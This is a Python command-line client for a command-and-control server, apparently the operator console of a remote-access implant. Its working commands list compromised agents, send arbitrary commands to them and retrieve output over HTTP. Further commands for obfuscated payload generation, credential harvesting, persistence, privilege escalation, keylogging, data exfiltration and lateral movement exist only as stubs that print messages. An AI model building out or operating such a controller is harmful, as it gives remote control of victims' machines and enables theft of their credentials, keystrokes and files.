######################################################################################################################################################################################################################
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
# without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
# to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
# portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE 
# AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
######################################################################################################################################################################################################################

import requests
import json
import typer
import os

app = typer.Typer()

C2_URL = "http://10.0.2.4:8080"
SELECTED_AGENT_FILE = "selected_agent.txt"

def save_selected_agent(agent_id: str):
    with open(SELECTED_AGENT_FILE, "w") as f:
        f.write(agent_id)

def load_selected_agent():
    if os.path.exists(SELECTED_AGENT_FILE):
        with open(SELECTED_AGENT_FILE, "r") as f:
            return f.read().strip()
    return None

@app.command()
def list_agents():
    response = requests.get(f"{C2_URL}/list_agents")
    agents = response.json().get("agents", [])
    for agent in agents:
        print(agent["AgentID"])

@app.command()
def select_agent(agent_id: str):
    save_selected_agent(agent_id)
    print(f"Selected agent: {agent_id}")

@app.command()
def send_command(command: str, agent_id: str = typer.Option(None, help="Agent ID to send the command to")):
    if not agent_id:
        agent_id = load_selected_agent()
        if not agent_id:
            print("No agent selected. Please specify an agent ID or select an agent first.")
            return
    
    payload = {
        "AgentID": agent_id,
        "Command": command
    }
    response = requests.post(f"{C2_URL}/sendcommand", json=payload)
    if response.status_code == 200:
        print(f"Command sent to agent {agent_id}: {command}")
    else:
        print(f"Failed to send command to agent {agent_id}: {response.text}")

@app.command()
def get_result(agent_id: str = typer.Option(None, help="Agent ID to get the result from")):
    if not agent_id:
        agent_id = load_selected_agent()
        if not agent_id:
            print("No agent selected. Please specify an agent ID or select an agent first.")
            return

    response = requests.get(f"{C2_URL}/result", params={"agent_id": agent_id})
    if response.status_code == 200:
        result = response.json().get("Result")
        print(f"Result from agent {agent_id}: {result}")
    else:
        print(f"Failed to get result from agent {agent_id}: {response.text}")

@app.command()
def generate_payload(platform: str):
    print(f"Generating obfuscated payload for platform: {platform}")
    # Implement the logic to generate the payload

@app.command()
def harvest_credentials():
    print("Harvesting credentials")
    # Implement the logic to harvest credentials

@app.command()
def establish_persistence():
    print("Establishing persistence")
    # Implement the logic to establish persistence

@app.command()
def escalate_privileges():
    print("Escalating privileges")
    # Implement the logic to escalate privileges

@app.command()
def gather_system_info(agent_id: str = typer.Option(None, help="Agent ID to gather system information from")):
    if not agent_id:
        agent_id = load_selected_agent()
        if not agent_id:
            print("No agent selected. Please specify an agent ID or select an agent first.")
            return

    print(f"Gathering system information from agent {agent_id}")
    # Implement the logic to gather system information

@app.command()
def exfiltrate_data(file_path: str):
    print(f"Exfiltrating data from file: {file_path}")
    # Implement the logic to exfiltrate data

@app.command()
def start_keylogger(agent_id: str = typer.Option(None, help="Agent ID to start the keylogger on")):
    if not agent_id:
        agent_id = load_selected_agent()
        if not agent_id:
            print("No agent selected. Please specify an agent ID or select an agent first.")
            return

    print(f"Starting keylogger on agent {agent_id}")
    # Implement the logic to start the keylogger

@app.command()
def move_laterally(target_ip: str, username: str, password: str):
    print(f"Moving laterally to target IP: {target_ip} with username: {username} and password: {password}")
    # Implement the logic to move laterally

if __name__ == "__main__":
    app()

